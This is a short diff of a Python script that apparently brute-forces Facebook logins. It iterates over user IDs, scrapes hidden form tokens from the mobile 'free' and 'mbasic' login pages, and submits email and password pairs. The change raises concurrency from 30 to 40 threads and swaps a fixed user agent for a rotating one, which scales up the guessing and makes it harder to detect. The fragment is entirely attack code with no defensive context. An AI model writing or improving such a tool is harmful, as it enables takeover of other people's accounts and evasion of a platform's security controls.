@@ -94,7 +94,7 @@ def main():
         fb = "free"
     else:
         fb = "mbasic"
-    with ThreadPool(max_workers=30) as update:
+    with ThreadPool(max_workers=40) as update:
 
         for xd in user:
             uid = "0" + xd
@@ -120,7 +120,7 @@ def host(uid, pwx, meth, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = agent
+            uax = ua()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
